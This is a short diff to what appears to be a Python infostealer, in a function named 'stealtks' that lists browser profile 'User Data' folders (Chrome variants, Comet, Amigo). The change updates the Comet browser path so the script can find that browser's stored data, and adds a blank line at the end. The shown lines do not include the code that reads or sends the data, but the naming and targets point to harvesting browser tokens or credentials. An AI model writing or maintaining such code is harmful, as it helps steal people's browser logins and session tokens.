@@ -261,7 +261,7 @@ def stealtks():
     paths = {
     '0Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
     '0ChromeSxS': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
-    '0Comet': os.path.join(local, 'Comet', 'User Data'),
+    '0Comet': os.path.join(local, 'Perplexity', 'Comet', 'User Data'),
     '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data'),
     '0ChromeDev': os.path.join(local, 'Google', 'Chrome Dev', 'User Data'),
     '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
@@ -404,6 +404,7 @@ def main():
         
 
 main()
+
 
 
 
